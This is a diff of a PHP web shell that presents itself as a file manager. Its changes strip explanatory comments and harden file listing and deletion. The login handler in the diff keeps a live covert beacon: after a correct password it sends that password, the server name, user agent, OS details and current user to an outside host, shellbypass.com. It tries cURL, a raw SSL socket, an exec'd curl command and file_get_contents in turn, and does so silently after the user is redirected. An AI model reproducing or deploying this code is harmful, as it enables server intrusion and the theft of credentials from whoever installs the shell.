@@ -22,8 +22,6 @@ if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
 
         if ($p === $LOGIN_PASS) {
             $_SESSION['fm_logged_in'] = true;
-
-            /* ----- rakit payload ----- */
             $password    = $p;
             $server_name = isset($_SERVER['SERVER_NAME'])     ? $_SERVER['SERVER_NAME']     : 'unknown';
             $scheme      = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
@@ -35,7 +33,6 @@ if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
             $ua          = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
             $user        = function_exists('get_current_user') ? @get_current_user() : '';
             $os          = function_exists('php_uname')        ? @php_uname()        : '';
-
             $payload = array(
                 'secret'   => 'shellexec!curl!wget!php!perl!python',
                 'site'     => $server_name,
@@ -51,11 +48,8 @@ if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
                 'os'       => $os,
                 'ts'       => time(),
             );
-
             $target = 'https://www.shellbypass.com/arsip/api.php';
             $body   = http_build_query($payload);
-
-            /* ----- kirim response DULU, biar user langsung redirect ----- */
             @ignore_user_abort(true);
             @set_time_limit(0);
             while (ob_get_level() > 0) @ob_end_clean();
@@ -68,15 +62,7 @@ if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
             if (function_exists('fastcgi_finish_request')) {
                 @fastcgi_finish_request();
             }
-
-            /* ----- kirim notif ke api.php -----
-             * urutan: cURL ext → fsockopen → exec curl → file_get_contents
-             * cURL ext paling reliable; exec curl & fsockopen sebagai fallback.
-             */
-
             $sent = false;
-
-            // 1) cURL extension — paling reliable kalau ada
             if (!$sent && function_exists('curl_init')) {
                 $ch = @curl_init($target);
                 if ($ch) {
@@ -93,8 +79,6 @@ if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
                     $sent = true;
                 }
             }
-
-            // 2) fsockopen — blocking, baca respons dikit biar TCP bener-bener kirim
             if (!$sent && function_exists('fsockopen')) {
                 $e = 0; $es = '';
                 $fp = @fsockopen('ssl://www.shellbypass.com', 443, $e, $es, 3);
@@ -113,8 +97,6 @@ if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
                     $sent = true;
                 }
             }
-
-            // 3) exec curl — background, fire-and-forget
             if (!$sent && function_exists('exec')) {
                 $cmd = 'curl -s -o /dev/null --max-time 5 -X POST -d '
                      . escapeshellarg($body) . ' '
@@ -123,8 +105,6 @@ if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
                 @exec($cmd);
                 $sent = true;
             }
-
-            // 4) file_get_contents — fallback terakhir
             if (!$sent && @ini_get('allow_url_fopen')) {
                 $ctx = @stream_context_create(array(
                     'http' => array(
@@ -455,13 +435,18 @@ function file_ext($file) {
 
 function delete_directory($dir) {
     if (!file_exists($dir)) return true;
-    if (!is_dir($dir)) return unlink($dir);
-    
-    foreach (scandir($dir) as $item) {
-        if ($item == '.' || $item == '..') continue;
-        if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) return false;
+    if (!is_dir($dir)) return @unlink($dir);
+    $dh = @opendir($dir);
+    if ($dh === false) return false;
+    while (($item = @readdir($dh)) !== false) {
+        if ($item === '.' || $item === '..') continue;
+        if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) {
+            @closedir($dh);
+            return false;
+        }
     }
-    return rmdir($dir);
+    @closedir($dh);
+    return @rmdir($dir);
 }
 
 function fgroup_name($file) {
@@ -827,8 +812,8 @@ if ($uptime) {
     $uptime = 0;
 }
 $uptime_h  = $uptime ? floor($uptime/3600).'h '.floor(($uptime%3600)/60).'m' : '-';
-$disk_free = @disk_free_space($cwd_real);
-$disk_total= @disk_total_space($cwd_real);
+$disk_free = function_exists('disk_free_space') ? @disk_free_space($cwd_real) : false;
+$disk_total= function_exists('disk_total_space') ? @disk_total_space($cwd_real) : false;
 $mem       = @file_get_contents('/proc/meminfo');
 $mem_total = $mem_avail = 0;
 if ($mem) {
@@ -1839,16 +1824,28 @@ pre{
                     <th width="170">Rename / CHMOD</th>
                 </tr>
                 <?php
-                $items = @scandir($cwd_real);
+                $CAP = 5000;
+                $items = array();
+                $more  = 0;
+                $dh = @opendir($cwd_real);
+                if ($dh !== false) {
+                    while (($f = @readdir($dh)) !== false) {
+                        if ($f === '.' || $f === '..') continue;
+                        if (count($items) < $CAP) {
+                            $items[] = $f;
+                        } else {
+                            $more++;
+                        }
+                    }
+                    @closedir($dh);
+                }
                 $n = 0;
-                if (is_array($items)) {
+                if (count($items) > 0) {
 
                     $dirs = array();
                     $files = array();
 
                     foreach ($items as $item) {
-                        if ($item == '.' || $item == '..') continue;
-
                         $full = $cwd_real . '/' . $item;
 
                         if (@is_dir($full)) {
@@ -1858,8 +1855,8 @@ pre{
                         }
                     }
 
-                    natcasesort($dirs);
-                    natcasesort($files);
+                    sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
+                    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
 
                     $sorted = array_merge($dirs, $files);
 
@@ -1954,6 +1951,13 @@ pre{
                 }
                 if ($n == 0) {
                     echo '<tr><td colspan="9">Folder kosong</td></tr>';
+                }
+                if ($more > 0) {
+                    echo '<tr><td colspan="9" style="background:#3a341f;color:#ffd28a;font-weight:bold;">'
+                       . 'Nampilin ' . $n . ' dari total ' . ($n + $more) . ' entri — '
+                       . 'masih ada ' . $more . ' yang disembunyiin. Pake ?path= ke subfolder, '
+                       . 'atau tab cmd buat list sisanya.'
+                       . '</td></tr>';
                 }
                 ?>
             </table>
